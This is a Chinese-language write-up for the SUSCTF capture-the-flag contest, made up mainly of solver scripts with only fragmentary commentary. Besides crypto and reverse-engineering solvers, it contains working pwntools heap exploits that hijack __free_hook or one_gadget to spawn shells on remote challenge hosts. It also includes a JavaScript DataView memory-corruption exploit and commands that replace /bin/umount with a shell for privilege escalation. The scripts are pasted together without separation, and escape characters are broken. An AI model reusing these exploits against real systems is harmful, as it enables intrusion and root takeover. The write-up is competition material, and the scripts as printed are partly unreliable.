# SUSTF-WriteUp

> 原文: https://www.ctfiot.com/28093.html
> ID: 28093

Web

fxxkcors

下载题目附件，不难看出 report 页面拥有 admin 权限而且会访问你提交的页面。

看 challenge

注册之后发现存在修改权限功能

查看源码发现会像 changeapi.php 里面提交数据

这里会因为本身不是 admin 账号而用不了这个功能 结合上面的分析，我们可以构造一个 HTML 页面

手速快可以截图到（

因为已知明文开头的 16 字节，所以 problem2 中可以枚举 seed3 的值，用明文、密文与 lfsr2 的输出异或得到 lfsr1 的输出，然后列出方程解方程得到 mask1，进而解密文件。

..算一道misc吧（

分析关键逻辑容易看出左移四位右移五位，直接套 tea 解密脚本

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from magic_box import *

def compare(lfsr2, plain, cipher):
    for i in range(4):
        tmp = cipher[i] ^ lfsr2.getrandbit(8)
        if tmp != plain[i]:
            return False
    return True

def main():
    n2 = 12
    fp = open("MTk4NC0wNC0wMQ==_6d30.enc", 'rb')
    cipher = fp.read(4)
    fp.close()
    plain = b"Date"
    for seed2 in range(1 << n2):
        for mask2 in range(1 << n2):
            lfsr2 = lfsr(seed2, mask2, n2)
            if (compare(lfsr2, plain, cipher)):
                print(seed2)
                print(mask2)
                return

if __name__ == '__main__':
    main()
from Crypto.Util.number import *
from magic_box import *

def gauss(a, n):
    r = 0
    for c in range(n):
        t = r
        for i in range(r, n):
            if a[i][c] == 1: 
                t = i
                break
        if a[t][c] == 0: 
            continue
        t_list = a[t]
        a[t] = a[r]
        a[r] = t_list
        for i in range(r + 1, n):
            if a[i][c] == 1:
                for j in range(c, n + 1):
                    a[i][j] ^= a[r][j]
        r += 1
    for i in range(n - 1, -1, -1):
        for j in range(i + 1, n):
            a[i][n] ^= a[i][j] & a[j][n]
    mask = 0
    for i in range(n):
        mask <<= 1
        mask |= a[i][n]
    return mask

def main():
    n1, n2 = 64, 12
    mask2 = 2053
    plain = b"Date: 1984-12-25"
    input_file = open("MTk4NC0xMi0yNQ==_76ff.enc", 'rb')
    cipher = input_file.read(8)
    cipher_text = input_file.read(8)
    cipher += cipher_text
    cipher_text += input_file.read()
    for seed3 in range(1 << 12):
        lfsr2 = lfsr(seed3, mask2, n2)
        sequence = ''
        for i in range(16):
            tmp = cipher[i] ^ plain[i] ^ lfsr2.getrandbit(8)
            sequence += bin(tmp)[2:].rjust(8, '0')
        a = [[] for i in range(64)]
        for i in range(64):
            for j in range(i, i + 64):
                a[i].append(int(sequence[j]))
            a[i].append(int(sequence[i + 64]))
        mask1 = gauss(a, n1)
        seed1 = int(sequence[:64], 2)
        lfsr1 = lfsr(seed1, mask1, n1)
        lfsr2 = lfsr(seed3, mask2, n2)
        for i in range(8):
            lfsr2.getrandbit(8)
        generator_ = generator(lfsr1, lfsr2, 0)
        ans = b""
        for ch in cipher_text:
            c = ch ^ generator_.getrandbit(8)
            ans += long_to_bytes(c)
        if b'SUSCTF' in ans:
            print(ans)
            return

if __name__ == '__main__':
    main()
# -*- coding: utf-8 -*-
from pwn import *
    #p=process('./1')
p=remote('124.71.147.225',9999)
    #libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc=ELF('libc.so.6')
elf=ELF('./1')
context(arch='amd64', os='linux')
context.log_level='debug'
def debug():
    gdb.attach(p)
    pause()
def lg(name,val):
    log.success(name+' : '+hex(val))
def add(size,con):
 p.recvuntil('cmd> ')
 p.sendline('1')
 p.recvuntil('data: ')
 p.sendline(str(size))
 p.recvuntil('content: ')
 p.send(con)
def delete(size):
 p.recvuntil('cmd> ')
 p.sendline('2')
 p.recvuntil('data: ')
 p.sendline(str(size))
def show(size):
 p.recvuntil('cmd> ')
 p.sendline('3')
 p.recvuntil('data: ')
 p.sendline(str(size))

add(0x20,'SonodaMari')
    #debug()
add(-0xa0,'a')
add(-0xb0,'a')
delete(-0xa0)
add(0x68,'a')

for i in range(0x8):
 add(0x90+i,'a')

delete(0x20)
delete(-0xb0)
delete(0)

for i in range(0x8):
 delete(0x97-i)
add(0x80,'a')
show(0x80)
libc.address=(u64(p.recvuntil('x7f')[-6:].ljust(8,'x00'))-libc.sym['__malloc_hook'])&0xfffffffff000
lg('libc.address',libc.address)
    #p.interactive()
add(0x50,p64(libc.sym['__free_hook']))
add(0x51,'/bin/sh')
add(0x52,p64(libc.sym['system']))
delete(0x51)
p.interactive()
realloc(0x40)
free
from pwn import *
p=process('./1')
elf=ELF('./1')
    #libc=ELF('libc.so.6')
libc=ELF('libc.so.6')
    #p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
    #libc=ELF('/glibc/2.27/64/lib/libc-2.27.so')
p=remote('124.71.185.75',9999)
context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])
context.log_level='debug'
def debug():
    gdb.attach(p)
    pause()
def lg(name,val):
    log.success(name+' : '+hex(val))

def config(a):
    p.recvuntil('ch> ')
    p.sendline('1')
    p.recvuntil('FRAME> ')
    p.send(a)
def rain():
    p.recvuntil('ch> ')
    p.sendline('3')
    #debug()
config('x00'*0x12+'a'*0x40)
config('x00'*0x12)
config('x00'*0x12)
    #p.interactive()

rain()
config(0x12*'xff'+p64(0x602f18)*5+p64(0x400e17)+p64(0x602f18)*2)
    #config('x00'*0x12+p64(elf.plt['puts'])*8)
config('x00'*0x12)
config('x00'*0x12)
p.recvuntil('ch> ')
p.sendline('2')
libc.address=u64(p.recvuntil('x7f')[-6:].ljust(8,'x00'))-libc.sym['putchar']
lg('libc.address',libc.address)
    #config(0x12*'xff'+'/bin/shx00'*5+p64(libc.sym['system'])+'/bin/shx00')
og=[0x4f365,0x4f3c2,0xe58b8,0xe58bf,0xe58c3,0x10a45c,0x10a468]
    #debug()

config('xff'*0x12+'shx00x00x00x00x00x00'*5+p64(libc.address+og[5])+'SonodaMari')
p.recvuntil('')
p.recvuntil('ch> ')
p.sendline('2')
p.interactive()
    #debug()
a1 = DataView(0x18)
a2 = DataView(0x18)
a3 = DataView(0x18)
a = RegExp("\w+")
a.su32 = DataView.prototype.setUint32;
a.gu32 = DataView.prototype.getUint32;
b = DataView(0x18)
a1.setUint32(0, 0xdeadbeef)
a2.setUint32(0, 0xdeadbeef)
a3.setUint32(0, 0xdeadbeef)
a4 = a1
a5 = a2
a6 = a3
delete(a3)
delete(a2)
delete(b)
a5.setUint8(0x20, 0xb8)
a7 = DataView(0x40)
a8 = DataView(0x40)
a8.setUint8(0x38, 0x10)
a8.setUint8(0x3c, 0x1)
libc1 = a.gu32(8)
libc2 = a.gu32(12)
a.su32(0x2510, 0x100)
a4.setUint32(0x98, libc1+0x2f28)
a4.setUint32(0x9c, libc2)
a5.setUint32(0, libc1-0x1967f0+0x91871)
a5.setUint32(4, libc2)
a6.setUint16(0, 0x1111)
a = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
rm /bin/umount
echo "#!/bin/sh" > /bin/umount
echo "/bin/sh" >> /bin/umount
chmod +x /bin/umount
exit
    #include <stdio.h>
    #include <stdint.h>
uint32_t key[4]={0x4445,0x4144 ,0x4245,0x4546 };

void decrypt(uint32_t v0, uint32_t v1)
{
        uint32_t index = 0x9e3779b9;
        uint32_t sum = index * 32;
        for (int i = 0; i < 32; i++)
        {
                v1 -= ((((v0 << 4) + key[2]) ^ (v0 + sum)) ^ ((v0 >> 5) + key[3]));
                v0 -= ((((v1 << 4) + key[0]) ^ (v1 + sum)) ^ ((v1 >> 5) + key[1]));
                sum -= index;
        }
        printf("%x", v0);
        printf("%x", v1);

} 

int main()
{

 uint32_t v1[3] ={0x3E8947CB,0x31358388,0xDA627361};
 uint32_t v2[3] ={0xCC944639,0x3B0B6893,0x3B2E6427};
 for(int i=0;i<3;i++)
     decrypt(v1[i],v2[i]);
    return 0;
}
//XBvfaEdQvbcrxPBh8AOcJ6gA
    #include<stdio.h>
int main()
{
 int dword_7FF7B8035B80[44] ={  5,  143,  158,  121,  42,  192,  104,  129,  45,  252,  207,  164,  181,  85,  95,  228,  157,  35,  214,  29,  241,  231,  151,  145,  6,  36,  66,  113,  60,  88,  92,  48,  25,  198,  245,  188,  75,  66,  93,  218,  88,  155,  36,  64};
 int dword_7FF7B8035C50[44] ={  86,  218,  205,  58,  126,  134,  19,  181,  29,  157,  252,  151,  140,  49,  107,  201,  251,  26,  226,  45,  220,  211,  241,  244,  54,  9,  32,  66,  4,  106,  113,  83,  120,  164,  151,  143,  122,  114,  57,  232,  61,  250,  64,  61};
 for(int i=0;i<44;i++) 
  printf("%c",dword_7FF7B8035B80[i]^dword_7FF7B8035C50[i]); 
 return 0;
}
//SUSCTF{40a339d4-f940-4fe0-b382-cabb310d2ead}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/1-1646103502.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/5-1646103502.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/1-1646103502-1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/4-1646103502.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/1-1646103503.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/5-1646103503.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/10-1646103503.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/8-1646103504.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/9-1646103504.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/4-1646103505.jpeg)